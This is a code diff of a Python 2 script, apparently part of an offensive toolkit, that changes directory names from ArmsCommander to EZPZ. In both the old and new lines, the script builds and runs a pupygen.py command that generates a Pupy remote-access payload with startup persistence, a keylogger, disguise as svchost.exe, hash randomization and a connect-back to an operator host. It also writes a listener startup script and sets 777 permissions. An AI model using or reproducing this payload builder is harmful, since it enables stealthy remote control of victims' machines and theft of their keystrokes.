@@ -128,7 +128,7 @@ if Format_Chosen == "ps1":
     file_extension = "ps1"
 if Format_Chosen == "apk":
     file_extension = "apk"
-cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -s persistence,method=startup -s keylogger -s hide_argv,name=svchost.exe -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
+cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -s persistence,method=startup -s keylogger -s hide_argv,name=svchost.exe -O {1} -A {2} -o /root/EZPZ/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
     Format_Chosen, # 0
     Operating_System, # 1
     Architecture_Value, #2
@@ -145,12 +145,12 @@ cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -s persistence,method=sta
 
 print colored(cmd_String,'red','on_white')
 os.system(cmd_String)
-# payload_dir = '/root/ArmsCommander/payloads/'
+# payload_dir = '/root/EZPZ/payloads/'
 tmp_dir = '/tmp'
 os.chdir(tmp_dir)
-cmd_String = 'cp -r pupy* /root/ArmsCommander/payloads/'
+cmd_String = 'cp -r pupy* /root/EZPZ/payloads/'
 os.system(cmd_String)
-print 'Payloads copied over to /root/ArmsCommander/payloads/ directory'
+print 'Payloads copied over to /root/EZPZ/payloads/ directory'
 # print colored('Your payload is generated and is %s','red','on_white') % Format_Chosen
 print colored('Your server that it is set to listen on is %s','red','on_white') % host_Connectback
 print colored('Your port that the payload is to connect back to is %s','red','on_white') % host_Port
@@ -160,14 +160,14 @@ print 'Remember all of this when you are going to start up your listener, handle
 # Generates a script file that will run Pupy Server with the correct parameters
 pupy_installation_path = '/root/pupy/pupy'
 premade_startup_script_string = "sudo python /root/pupy/pupy/pupysh.py -t " + transport_Dict[Transport_Type] + ' -p ' + host_Port
-premade_startup_script_location = "/root/ArmsCommander/payloads/pupy_server_startup.sh"
+premade_startup_script_location = "/root/EZPZ/payloads/pupy_server_startup.sh"
 saved_startup_file = open(premade_startup_script_location, 'w')
 saved_startup_file.write('cd ' + pupy_installation_path)
 saved_startup_file.write('\n' + premade_startup_script_string)
 saved_startup_file.close()
 
-# Modifies file permissiosn in /root/ArmsCommander to allow the startup script to execute
-os.system('chmod 777 /root/ArmsCommander/*')
+# Modifies file permissiosn in /root/EZPZ to allow the startup script to execute
+os.system('chmod 777 /root/EZPZ/*')
 print 'PREGENERATED SERVER STARTUP SCRIPT CREATED'
 print 'Your startup script is located at: %s' % premade_startup_script_location
-os.system('python /root/ArmsCommander/remoteexploits/Pupy_Menu.py')
+os.system('python /root/EZPZ/remoteexploits/Pupy_Menu.py')
